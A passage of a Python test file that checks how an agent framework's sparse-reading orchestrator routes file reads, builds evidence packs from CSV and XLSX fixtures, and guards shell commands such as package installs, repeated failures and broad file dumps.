    assert "run_scheduled_fetch.py" in pack.next_action["covered_sources"]
    assert "seen_ids=3" in closure
    assert "orphan_seen_ids=1" in closure
    assert "missing_expected_csv=summary_2026-02-09.csv" in closure
    assert "overall_status: ready_for_write" in closure
    assert "deduplicate_function_bug" in closure
    assert "list(seen)[-5000:]" in closure
    assert "sorted(seen, key=int)[-5000:]" in closure
    assert "important_breakdown: count=2" in closure
    assert "report_requirement=list every important_item below" in closure
    assert "important_item_1:" in closure
    assert "important_item_2:" in closure
    assert "Ping An Bank" in closure
    assert "max_pages=3" in closure
    assert "enabled=False" in closure
    assert "copy every important_item" in pack.next_action["instruction"]

    tool = ReadFileTool(workspace=tmp_path, sro=sro)
    result = asyncio.run(tool.execute(path="run_scheduled_fetch.py"))
    payload = json.loads(result)
    assert payload["sro_guard"] is True
    assert payload["allowed_next"] == ["write_file"]
    assert payload["next_action"]["tool"] == "write_file"

    policy = SparseCommandPolicy(sro)
    assert policy.guard("cat run_scheduled_fetch.py", str(tmp_path)) is None
    assert policy.guard("python3 -c \"print(open('run_scheduled_fetch.py').read())\"", str(tmp_path)) is None
    grep = GrepTool(workspace=tmp_path, sro=sro)
    grep_result = asyncio.run(grep.execute(pattern="deduplicate", path="run_scheduled_fetch.py", output_mode="content"))
    assert "deduplicate" in grep_result


def test_collection_collect_audit_closure_beats_expand_selected_sources(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    (tmp_path / "output").mkdir()
    (tmp_path / "config.yaml").write_text("output:\n  csv_summary: true\napi:\n  max_pages: 3\n", encoding="utf-8")
    (tmp_path / "fetch_state.json").write_text(json.dumps({"seen_ids": ["1", "2"]}), encoding="utf-8")
    (tmp_path / "output" / "announcements_2026-02-09.json").write_text(
        json.dumps([{"announcementId": "2", "important": True, "secName": "Example", "announcementTitle": "Important"}]),
        encoding="utf-8",
    )
    (tmp_path / "run_scheduled_fetch.py").write_text(
        "def deduplicate(announcements, state):\n"
        "    seen = set(state.get('seen_ids', []))\n"
        "    state['seen_ids'] = list(seen)[-5000:]\n"
        "def save_announcements(announcements, cfg):\n"
        "    save_csv_summary(announcements, '2026-02-09')\n",
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)

    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "collect",
        {
            "goal": "Audit files for bugs, gaps, and important announcements",
            "needles": ["config.yaml contents", "run_scheduled_fetch.py full source", "announcements_2026-02-09.json contents"],
            "want": "fact",
            "scope": "expand",
            "type_hint": "collection",
        },
    )

    assert [block.anchor for block in pack.evidence] == ["collection_audit_closure"]
    assert pack.next_action["allowed_next"] == ["write_file"]


def test_panel_did_bundle_uses_native_gate(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    (tmp_path / "data").mkdir()
    (tmp_path / "scripts").mkdir()
    (tmp_path / "data" / "panel_data.csv").write_text(
        "firm_id,year,treated,post,did,revenue_growth_pct,log_assets,leverage,roa,employees_thousands,rd_intensity,industry\n"
        "F001,2019,1,0,0,10,8,0.4,0.05,4,0.02,Manufacturing\n"
        "F001,2020,1,1,1,16,8,0.4,0.05,4,0.02,Manufacturing\n"
        "F002,2019,0,0,0,9,7,0.3,0.04,3,0.01,Retail\n"
        "F002,2020,0,1,0,11,7,0.3,0.04,3,0.01,Retail\n",
        encoding="utf-8",
    )
    (tmp_path / "data" / "firm_metadata.csv").write_text(
        "firm_id,firm_name,industry,treated\nF001,Alpha,Manufacturing,1\nF002,Beta,Retail,0\n",
        encoding="utf-8",
    )
    (tmp_path / "data" / "data_dictionary.json").write_text(
        '{"notes":["True DGP DID coefficient: 3.5"]}',
        encoding="utf-8",
    )
    (tmp_path / "scripts" / "did_regression.py").write_text(
        "# TODO: naive template only\n",
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    assert card.recommended_mode == "native_read"

    tool = ListDirTool(workspace=tmp_path, sro=sro)
    listing = asyncio.run(tool.execute(path=str(tmp_path), recursive=True))
    assert "sro_handoff" not in listing
    assert "data/panel_data.csv" in listing
    assert not sro.should_handoff_read(tmp_path / "data" / "panel_data.csv")

    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "collect",
        {
            "goal": "Run DID regression on panel data with firm fixed effects, year fixed effects, clustered standard errors, and parallel trends",
            "needles": ["DID", "firm fixed effects", "year fixed effects", "parallel trends"],
            "want": "fact",
            "type_hint": "collection",
        },
    )

    assert pack.summary.startswith("low-sparse fallback")
    assert pack.next_action is not None
    assert "native read listed files" in pack.next_action["allowed_next"]


def test_native_workspace_still_intercepts_intrinsically_sparse_child(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    (tmp_path / "data").mkdir()
    (tmp_path / "scripts").mkdir()
    (tmp_path / "docs").mkdir()
    (tmp_path / "data" / "panel_data.csv").write_text(
        "firm_id,year,did,revenue_growth_pct\nF001,2020,1,16\n",
        encoding="utf-8",
    )
    (tmp_path / "data" / "firm_metadata.csv").write_text("firm_id,industry\nF001,Manufacturing\n", encoding="utf-8")
    (tmp_path / "data" / "data_dictionary.json").write_text('{"ATT":3.5}', encoding="utf-8")
    (tmp_path / "scripts" / "did_regression.py").write_text("# regression script\n", encoding="utf-8")
    long_report = tmp_path / "docs" / "long_report.md"
    long_report.write_text("# Report\n\n" + ("needle fact in long prose.\n" * 500), encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)

    root_card = sro.card(tmp_path)
    child_card = sro.card(long_report)

    assert root_card.recommended_mode == "native_read"
    assert SparseReadingOrchestrator.disabled_for_low_sparse_workspace(tmp_path)
    assert child_card.recommended_mode == "collect_if_multi_fact_else_scout"
    assert sro.should_handoff_read(long_report)

    reader = ReadFileTool(workspace=tmp_path, sro=sro)
    payload = json.loads(asyncio.run(reader.execute(path="docs/long_report.md")))
    assert payload["sro_handoff"] is True
    assert payload["file_card"]["type"] in {"text", "md", "markdown"}


def test_access_handoff_requests_lazy_macro_activation(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    long_report = tmp_path / "long_report.md"
    long_report.write_text("# Report\n\n" + ("needle fact in long prose.\n" * 500), encoding="utf-8")
    activated = False

    def activate() -> None:
        nonlocal activated
        activated = True
        sro.mark_macro_available()

    sro = SparseReadingOrchestrator(
        tmp_path,
        macro_activation_callback=activate,
        macro_available=False,
    )
    reader = ReadFileTool(workspace=tmp_path, sro=sro)

    payload = json.loads(asyncio.run(reader.execute(path="long_report.md")))

    assert payload["sro_handoff"] is True
    assert payload["next_action"]["tool"] == "sro_read"
    assert activated is True
    assert sro.macro_available is True


def test_native_workspace_tool_descriptions_do_not_advertise_sro(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    sro = SparseReadingOrchestrator(tmp_path, macro_available=False)

    reader = ReadFileTool(workspace=tmp_path, sro=sro)
    lister = ListDirTool(workspace=tmp_path, sro=sro)

    assert "SRO" not in reader.description
    assert "SRO" not in lister.description


def test_force_sro_tool_descriptions_keep_protocol_hint(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    sro = SparseReadingOrchestrator(tmp_path, macro_available=True)

    reader = ReadFileTool(workspace=tmp_path, sro=sro)
    lister = ListDirTool(workspace=tmp_path, sro=sro)

    assert "SRO" in reader.description
    assert "SRO" in lister.description


def test_access_handoff_ignores_small_log_inside_native_bundle(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    (tmp_path / "config").mkdir()
    (tmp_path / "logs").mkdir()
    (tmp_path / "scripts").mkdir()
    (tmp_path / "config" / "task_scheduler.yaml").write_text(
        "tasks:\n  daily:\n    script: scripts/send.py\n",
        encoding="utf-8",
    )
    (tmp_path / "config" / "messaging.yaml").write_text("providers:\n  telegram:\n    enabled: true\n", encoding="utf-8")
    log = tmp_path / "logs" / "book_recommendation.log"
    log.write_text("2026-03-19 ERROR Telegram 429 retry_after=3600\n" * 80, encoding="utf-8")
    (tmp_path / "scripts" / "send.py").write_text("print('send')\n", encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path, macro_available=False)

    assert sro.benefit_gate.decide(sro.inspect(tmp_path)).mode == "native"
    assert not sro.should_handoff_read(log)


def test_shell_policy_requests_lazy_macro_activation(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    long_report = tmp_path / "long_report.md"
    long_report.write_text("# Report\n\n" + ("needle fact in long prose.\n" * 500), encoding="utf-8")
    activated = False

    def activate() -> None:
        nonlocal activated
        activated = True
        sro.mark_macro_available()

    sro = SparseReadingOrchestrator(
        tmp_path,
        macro_activation_callback=activate,
        macro_available=False,
    )
    policy = SparseCommandPolicy(sro)

    blocked = policy.guard("cat long_report.md", str(tmp_path))

    assert blocked is not None
    assert "sro_read" in blocked
    assert activated is True
    assert sro.macro_available is True


def test_collection_collect_falls_back_for_small_full_analysis_bundle(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    (tmp_path / "data").mkdir()
    (tmp_path / "config").mkdir()
    for name, text in {
        "data/rag_forecast_output.json": '{"forecast_values":[111.3]}',
        "data/actual_future_values.csv": "step,actual_flow\n1,126.0\n",
        "data/baseline_forecasts.csv": "step,arima_forecast\n1,125.2\n",
        "config/analysis_parameters.json": '{"normalization_factor":10}',
        "data/sensor_metadata.yaml": "sensor_id: S-4021\n",
    }.items():
        (tmp_path / name).write_text(text, encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    assert card.recommended_mode == "native_read"
    tool = ListDirTool(workspace=tmp_path, sro=sro)
    listing = asyncio.run(tool.execute(path=str(tmp_path), recursive=True))
    assert "sro_handoff" not in listing

    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "collect",
        {
            "goal": "Create a statistical assessment report, metrics summary, and reproducible analysis.py script from forecast actual baseline data",
            "needles": ["forecast", "actual", "baseline", "metrics", "analysis.py"],
            "want": "fact",
            "type_hint": "collection",
        },
    )

    assert pack.summary.startswith("low-sparse fallback")
    assert pack.next_action is not None
    assert "native read listed files" in pack.next_action["allowed_next"]
    assert not sro.should_handoff_read(tmp_path / "config" / "analysis_parameters.json")
    assert not sro.should_handoff_list(tmp_path)


def test_low_sparse_workspace_disables_sro_runtime(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    (tmp_path / "data").mkdir()
    (tmp_path / "config").mkdir()
    for name, text in {
        "data/rag_forecast_output.json": '{"forecast_values":[111.3]}',
        "data/actual_future_values.csv": "step,actual_flow\n1,126.0\n",
        "data/baseline_forecasts.csv": "step,arima_forecast\n1,125.2\n",
        "config/analysis_parameters.json": '{"normalization_factor":10}',
    }.items():
        (tmp_path / name).write_text(text, encoding="utf-8")

    assert SparseReadingOrchestrator.disabled_for_low_sparse_workspace(tmp_path)


def test_sro_does_not_handoff_generated_reports(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    reports = tmp_path / "reports"
    reports.mkdir()
    report = reports / "rag_forecast_assessment.md"
    report.write_text("# Report\n\n" + ("metric: value\n" * 800), encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)

    assert not sro.should_handoff_read(report)


def test_sro_does_not_handoff_root_generated_diagnosis_report(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    report = tmp_path / "diagnosis_report.md"
    report.write_text("# Diagnosis\n\n" + ("finding\n" * 900), encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)

    assert sro.is_output_artifact(report)
    assert not sro.should_handoff_read(report)


def test_sro_does_not_handoff_builtin_skill_files(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    skill = tmp_path / "nanobot" / "skills" / "sparse-reading" / "SKILL.md"
    skill.parent.mkdir(parents=True)
    skill.write_text("# Skill\n\n" + ("Use SRO.\n" * 800), encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)

    assert not sro.should_handoff_read(skill)


def test_sro_does_not_handoff_runtime_artifacts(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    runtime = tmp_path / ".nanobot" / "tool-results" / "cli_task" / "large.txt"
    runtime.parent.mkdir(parents=True)
    runtime.write_text("tool output\n" * 800, encoding="utf-8")
    session = tmp_path / "sessions" / "cli_task.jsonl"
    session.parent.mkdir()
    session.write_text("{}\n" * 800, encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)

    assert sro.is_runtime_artifact(runtime)
    assert not sro.should_handoff_read(runtime)
    assert sro.is_runtime_artifact(session)
    assert not sro.should_handoff_read(session)


def test_sro_does_not_handoff_workspace_external_scratch_file(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    scratch = tmp_path.parent / "did_output.txt"
    scratch.write_text("long generated output\n" + ("x" * 5000), encoding="utf-8")
    sro = SparseReadingOrchestrator(tmp_path)
    reader = ReadFileTool(workspace=tmp_path, extra_allowed_dirs=[tmp_path.parent], sro=sro)

    result = asyncio.run(reader.execute(path=str(scratch)))

    assert "sro_handoff" not in result
    assert "long generated output" in result


def test_read_file_does_not_handoff_agent_written_file(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    sro = SparseReadingOrchestrator(tmp_path)
    writer = WriteFileTool(workspace=tmp_path)
    reader = ReadFileTool(workspace=tmp_path, sro=sro)

    asyncio.run(writer.execute(path="generated_report.md", content="# Report\n\n" + ("details\n" * 900)))
    result = asyncio.run(reader.execute(path="generated_report.md"))

    assert "sro_handoff" not in result
    assert "# Report" in result


def test_collection_collect_guards_covered_child_reads(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    (tmp_path / "logs").mkdir()
    log = tmp_path / "logs" / "book_recommendation.log"
    log.write_text(
        "2026-03-19 09:00:03 ERROR Telegram API HTTPError 429 retry_after=3600\n"
        + "padding\n" * 800,
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    sro.read(
        {"artifact_id": card.artifact_id},
        "collect",
        {
            "goal": "Diagnose book recommendation failure from logs",
            "needles": ["429", "retry_after"],
            "want": "fact",
            "type_hint": "collection",
        },
    )
    tool = ReadFileTool(workspace=tmp_path, sro=sro)

    result = asyncio.run(tool.execute(path=str(log)))

    payload = json.loads(result)
    assert payload["sro_guard"] is True
    assert payload["covered_by_artifact"] == card.artifact_id
    assert payload["next_action"]["tool"] == "write_file"


def test_ready_collection_repeated_sro_read_escapes_to_native(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    source = _write_ready_audit_bundle(tmp_path)
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    hint = {
        "goal": "Audit fetch state vs output, code bugs, missing outputs, and important announcements",
        "needles": ["seen_ids", "csv_summary", "deduplicate", "important"],
        "want": "fact",
        "type_hint": "collection",
    }
    ready = sro.read({"artifact_id": card.artifact_id}, "collect", hint)
    assert ready.next_action["overall_status"] == "ready"

    first_repeat = sro.read({"artifact_id": card.artifact_id}, "collect", hint)
    second_repeat = sro.read({"artifact_id": card.artifact_id}, "collect", hint)

    assert first_repeat.next_action["guard"] == "ready_collection_artifact"
    assert second_repeat.next_action["guard"] == "native_escape"
    assert second_repeat.evidence == []
    assert not sro.should_handoff_read(source)


def test_ready_collection_child_guard_is_one_shot_then_native(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    source = _write_ready_audit_bundle(tmp_path)
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(tmp_path)
    ready = sro.read(
        {"artifact_id": card.artifact_id},
        "collect",
        {
            "goal": "Audit fetch state vs output, code bugs, missing outputs, and important announcements",
            "needles": ["seen_ids", "csv_summary", "deduplicate", "important"],
            "want": "fact",
            "type_hint": "collection",
        },
    )
    assert ready.next_action["overall_status"] == "ready"
    tool = ReadFileTool(workspace=tmp_path, sro=sro)

    first = asyncio.run(tool.execute(path=str(source)))
    second = asyncio.run(tool.execute(path=str(source)))

    assert json.loads(first)["sro_guard"] is True
    assert "sro_guard" not in second
    assert "deduplicate" in second


def test_exec_policy_blocks_exact_repeated_failure(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    policy = SparseCommandPolicy()
    tool = ExecTool(working_dir=str(tmp_path), sro_policy=policy)

    first = asyncio.run(tool.execute("grep needle missing.txt"))
    second = asyncio.run(tool.execute("grep needle missing.txt"))

    assert "Exit code:" in first
    assert "exact same command already failed" in second


def test_exec_policy_allows_rerunning_python_scripts(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    policy = SparseCommandPolicy()
    script = tmp_path / "analysis.py"
    script.write_text("raise SystemExit(1)\n", encoding="utf-8")
    tool = ExecTool(working_dir=str(tmp_path), sro_policy=policy)

    first = asyncio.run(tool.execute("python analysis.py"))
    second = asyncio.run(tool.execute("python analysis.py"))

    assert "Exit code:" in first
    assert "exact same command already failed" not in second


def test_exec_policy_allows_rerunning_python_scripts_after_cd(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    policy = SparseCommandPolicy()
    script = tmp_path / "analysis.py"
    script.write_text("raise SystemExit(1)\n", encoding="utf-8")
    tool = ExecTool(working_dir=str(tmp_path), sro_policy=policy)

    command = f"cd {tmp_path} && python3 analysis.py 2>&1"
    first = asyncio.run(tool.execute(command))
    second = asyncio.run(tool.execute(command))

    assert "Exit code:" in first
    assert "exact same command already failed" not in second


def test_policy_blocks_broad_pdf_dump(tmp_path):
    policy = SparseCommandPolicy()
    pdf = tmp_path / "paper.pdf"
    pdf.write_bytes(b"%PDF fake")

    assert policy.guard(f"pdftotext {pdf} -", str(tmp_path))
    assert policy.guard(f"grep needle {pdf}", str(tmp_path))


def test_policy_blocks_package_install_in_sro_runs(tmp_path):
    policy = SparseCommandPolicy()

    blocked = policy.guard("apt-get update && apt-get install -y python3-statsmodels", str(tmp_path))

    assert blocked
    assert "package installation is blocked" in blocked


def test_policy_blocks_python_direct_large_file_reads(tmp_path):
    policy = SparseCommandPolicy()
    csv_path = tmp_path / "quarterly_sales.csv"
    csv_path.write_text("a,b\n" + "\n".join(f"{i},{i}" for i in range(400)), encoding="utf-8")
    xlsx_path = tmp_path / "company_expenses.xlsx"
    xlsx_path.write_bytes(b"x" * 2048)

    blocked = policy.guard(
        (
            "python3 - <<'EOF'\n"
            "import pandas as pd\n"
            "pd.read_csv('quarterly_sales.csv')\n"
            "pd.read_excel('company_expenses.xlsx')\n"
            "EOF"
        ),
        str(tmp_path),
    )
    assert blocked
    assert "direct Python read" in blocked


def test_policy_blocks_head_on_large_supported_file(tmp_path):
    policy = SparseCommandPolicy()
    csv_path = tmp_path / "users.csv"
    csv_path.write_text("a,b\n" + "\n".join(f"{i},{i}" for i in range(400)), encoding="utf-8")

    blocked = policy.guard("head -100 users.csv", str(tmp_path))

    assert blocked
    assert "broad shell dump" in blocked


def test_policy_allows_cat_on_generated_report(tmp_path):
    policy = SparseCommandPolicy()
    reports = tmp_path / "reports"
    reports.mkdir()
    report = reports / "rag_forecast_assessment.md"
    report.write_text("# Report\n\n" + ("metric: value\n" * 800), encoding="utf-8")

    allowed = policy.guard("cat reports/rag_forecast_assessment.md", str(tmp_path))

    assert allowed is None


def test_policy_allows_cat_on_root_generated_diagnosis_report(tmp_path):
    policy = SparseCommandPolicy()
    report = tmp_path / "diagnosis_report.md"
    report.write_text("# Diagnosis\n\n" + ("finding\n" * 900), encoding="utf-8")

    allowed = policy.guard("cat diagnosis_report.md", str(tmp_path))

    assert allowed is None


def test_policy_allows_command_security_root_outputs(tmp_path):
    policy = SparseCommandPolicy()
    report = tmp_path / "security_analysis_report.md"
    report.write_text("# Security\n\n" + ("finding\n" * 900), encoding="utf-8")
    classifications = tmp_path / "command_classifications.json"
    classifications.write_text('{"analyzed_commands": []}\n' * 600, encoding="utf-8")

    assert policy.guard("cat security_analysis_report.md", str(tmp_path)) is None
    assert policy.guard("python3 -c \"import json; json.load(open('command_classifications.json'))\"", str(tmp_path)) is None


def test_policy_and_grep_block_broad_text_search_after_slot_digest(tmp_path, monkeypatch):
    monkeypatch.setenv("SRO_ENABLED", "1")
    source = tmp_path / "document.txt"
    source.write_text(
        "The public registry had 5,705 community-built skills.\n" * 500,
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(source)
    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "collect",
        {
            "goal": "Answer report facts",
            "artifact": card.artifact_id,
            "type_hint": "text",
            "slots": [
                {
                    "id": "total_skills",
                    "question": "How many community-built skills were in the public registry?",
                    "expected": "count",
                }
            ],
        },
    )
    assert pack.slot_digest is not None

    policy = SparseCommandPolicy(sro)
    blocked = policy.guard("grep -i registry document.txt | head -20", str(tmp_path))
    assert blocked
    assert "slot_digest" in blocked

    grep = GrepTool(workspace=tmp_path, sro=sro)
    grep_result = asyncio.run(grep.execute(pattern="registry", path="document.txt", output_mode="content"))
    assert "slot_digest" in grep_result


def test_policy_allows_python_calculation_without_large_file_read(tmp_path):
    policy = SparseCommandPolicy()
    csv_path = tmp_path / "quarterly_sales.csv"
    csv_path.write_text("a,b\n" + "\n".join(f"{i},{i}" for i in range(400)), encoding="utf-8")

    allowed = policy.guard(
        "python3 - <<'EOF'\nprint(sum([1, 2, 3]))\nEOF",
        str(tmp_path),
    )
    assert allowed is None


def test_policy_blocks_office_package_dump(tmp_path):
    policy = SparseCommandPolicy()
    xlsx_path = tmp_path / "company_expenses.xlsx"
    xlsx_path.write_bytes(b"x" * 2048)

    blocked = policy.guard(
        "unzip -p company_expenses.xlsx xl/worksheets/sheet2.xml",
        str(tmp_path),
    )
    assert blocked
    assert "Office package extraction" in blocked


def test_hintspec_normalizes_common_want_aliases():
    hint, errors = HintSpec.from_obj(
        {
            "goal": "Get full structure of both sheets",
            "needles": ["budget"],
            "want": "Full structure of both sheets",
            "type_hint": "table",
        }
    )

    assert hint is not None
    assert errors == []
    assert hint.want == "schema"
    assert hint.type_hint == "auto"


def test_hintspec_normalizes_scope_and_complete_data_aliases():
    hint, errors = HintSpec.from_obj(
        {
            "goal": "Get overview of CSV structure and all data rows",
            "needles": ["all data rows"],
            "want": "complete data",
            "scope": "all",
            "type_hint": "csv",
        }
    )

    assert hint is not None
    assert errors == []
    assert hint.want == "table"
    assert hint.scope == "expand"


def test_small_csv_focus_returns_full_table(tmp_path):
    csv_path = tmp_path / "sales.csv"
    csv_path.write_text(
        "region,product,revenue\n"
        "North,A,100\n"
        "South,B,200\n"
        "East,C,300\n"
        "West,D,400\n",
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(csv_path)

    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "focus",
        {
            "goal": "Get all rows of the CSV",
            "needles": ["all rows"],
            "want": "table",
            "scope": "expand",
            "artifact": card.artifact_id,
            "type_hint": "csv",
        },
    )

    assert pack.evidence
    assert pack.evidence[0].anchor == "rows"
    assert pack.calc_ready is not None
    tsv_path = Path(pack.calc_ready["tables"][0]["tsv_path"])
    assert tsv_path.exists()
    assert "West\tD\t400" in tsv_path.read_text(encoding="utf-8")
    assert pack.unresolved == []


def test_small_csv_focus_returns_calc_ready_payload(tmp_path):
    csv_path = tmp_path / "sales.csv"
    csv_path.write_text(
        "region,product,revenue\n"
        "North,A,100\n"
        "South,B,200\n"
        "East,C,300\n",
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(csv_path)

    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "focus",
        {
            "goal": "Get all rows of the CSV for exact calculation",
            "needles": ["all rows"],
            "want": "table",
            "scope": "expand",
            "artifact": card.artifact_id,
            "type_hint": "csv",
        },
    )

    assert pack.calc_ready is not None
    assert pack.calc_ready["kind"] == "structured_rows"
    table = pack.calc_ready["tables"][0]
    tsv_path = Path(table["tsv_path"])
    lines = tsv_path.read_text(encoding="utf-8").splitlines()
    assert lines[0] == "region	product	revenue"
    assert "South	B	200" in lines
    assert table["columns"] == ["region", "product", "revenue"]
    assert table["column_count"] == 3
    assert pack.summary == "CSV subset ready: 3 rows x 3 columns"
    assert pack.calc_ready["python_variable"] == "calc_ready"
    assert "tsv_path" in pack.calc_ready["python_prelude"]
    assert pack.next_action is not None
    assert pack.next_action["tool"] == "exec"
    assert pack.next_action["priority"] == "immediate"
    assert len(pack.next_action["instructions"]) == 2


def test_small_csv_focus_infers_full_table_from_goal_without_want(tmp_path):
    csv_path = tmp_path / "expenses.csv"
    csv_path.write_text(
        "employee,department,amount\n"
        "Alice,Engineering,1250\n"
        "Bob,Marketing,450\n"
        "Carol,Sales,890\n"
        "Diana,Engineering,780\n",
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(csv_path)

    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "focus",
        {
            "goal": "Get all 4 expense records with employee department and amount",
            "needles": [],
            "artifact": card.artifact_id,
            "type_hint": "csv",
        },
    )

    assert pack.evidence
    assert pack.evidence[0].anchor == "rows"
    assert pack.calc_ready is not None
    tsv_path = Path(pack.calc_ready["tables"][0]["tsv_path"])
    assert "Alice\tEngineering\t1250" in tsv_path.read_text(encoding="utf-8")
    assert pack.unresolved == []


def test_csv_focus_projects_relevant_columns_into_subset_artifact(tmp_path):
    headers = ["Date", "Region", "Product", "Units_Sold", "Unit_Price", "Revenue", "Cost"]
    rows = [
        ["2024-01-15", "North", "Widget A", "150", "25.00", "3750.00", "2250.00"],
        ["2024-01-22", "South", "Widget B", "200", "30.00", "6000.00", "3600.00"],
        ["2024-02-03", "East", "Widget A", "175", "25.00", "4375.00", "2625.00"],
        ["2024-02-18", "West", "Widget C", "90", "50.00", "4500.00", "2700.00"],
        ["2024-03-05", "North", "Widget B", "220", "30.00", "6600.00", "3960.00"],
        ["2024-03-21", "South", "Widget A", "160", "25.00", "4000.00", "2400.00"],
        ["2024-04-02", "East", "Widget C", "110", "50.00", "5500.00", "3300.00"],
        ["2024-04-18", "West", "Widget B", "180", "30.00", "5400.00", "3240.00"],
        ["2024-05-07", "North", "Widget C", "95", "50.00", "4750.00", "2850.00"],
        ["2024-05-23", "South", "Widget B", "190", "30.00", "5700.00", "3420.00"],
        ["2024-06-11", "East", "Widget A", "165", "25.00", "4125.00", "2475.00"],
        ["2024-06-27", "West", "Widget C", "100", "50.00", "5000.00", "3000.00"],
        ["2024-07-09", "North", "Widget A", "170", "25.00", "4250.00", "2550.00"],
        ["2024-07-25", "South", "Widget C", "85", "50.00", "4250.00", "2550.00"],
        ["2024-08-08", "East", "Widget B", "210", "30.00", "6300.00", "3780.00"],
        ["2024-08-22", "West", "Widget A", "155", "25.00", "3875.00", "2325.00"],
        ["2024-09-05", "North", "Widget C", "120", "50.00", "6000.00", "3600.00"],
        ["2024-09-19", "South", "Widget A", "145", "25.00", "3625.00", "2175.00"],
        ["2024-10-03", "East", "Widget C", "115", "50.00", "5750.00", "3450.00"],
        ["2024-10-17", "West", "Widget B", "195", "30.00", "5850.00", "3510.00"],
        ["2024-11-01", "North", "Widget B", "205", "30.00", "6150.00", "3690.00"],
        ["2024-11-14", "South", "Widget C", "98", "50.00", "4900.00", "2940.00"],
        ["2024-12-03", "East", "Widget B", "230", "30.00", "6900.00", "4140.00"],
        ["2024-12-19", "West", "Widget C", "105", "50.00", "5250.00", "3150.00"],
    ]
    csv_path = tmp_path / "quarterly_sales.csv"
    csv_path.write_text(
        ",".join(headers) + "\n" + "\n".join(",".join(row) for row in rows) + "\n",
        encoding="utf-8",
    )
    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(csv_path)

    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "focus",
        {
            "goal": "Get all rows needed to compare region, revenue, and cost",
            "needles": ["Region", "Revenue", "Cost", "all rows"],
            "want": "table",
            "scope": "expand",
            "artifact": card.artifact_id,
            "type_hint": "csv",
        },
    )

    payload = json.dumps({"evidence_pack": pack.to_dict()}, ensure_ascii=False, indent=2)
    assert len(payload) <= 3200
    assert pack.calc_ready is not None
    table = pack.calc_ready["tables"][0]
    assert table["columns"] == ["Region", "Revenue", "Cost"]
    assert table["column_count"] == 3
    assert Path(table["tsv_path"]).exists()
    assert Path(table["tsv_path"]).read_text(encoding="utf-8").splitlines()[0] == "Region	Revenue	Cost"
    assert pack.unresolved == []


def test_small_xlsx_focus_returns_calc_ready_payload(tmp_path):
    openpyxl = pytest.importorskip("openpyxl")

    xlsx_path = tmp_path / "company_expenses.xlsx"
    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "Q1_Expenses"
    ws.append(["Employee", "Department", "Category", "Amount", "Date"])
    ws.append(["Alice Chen", "Engineering", "Travel", 1250, "2024-01-10"])
    ws.append(["Bob Martinez", "Marketing", "Software", 450, "2024-01-15"])
    budget = wb.create_sheet("Budgets")
    budget.append(["Department", "Q1_Budget", "Q2_Budget", "Q3_Budget", "Q4_Budget"])
    budget.append(["Engineering", 25000, 28000, 30000, 27000])
    budget.append(["Marketing", 18000, 20000, 19000, 21000])
    wb.save(xlsx_path)
    wb.close()

    sro = SparseReadingOrchestrator(tmp_path)
    card = sro.card(xlsx_path)

    pack = sro.read(
        {"artifact_id": card.artifact_id},
        "focus",
        {
            "goal": "Get Employee, Department, and Amount rows from Q1_Expenses and Department plus Q4_Budget rows from Budgets",
            "needles": ["Employee", "Department", "Amount", "Q4_Budget", "all rows"],
            "want": "table",
            "scope": "expand",
            "artifact": card.artifact_id,
            "type_hint": "xlsx",
        },
    )

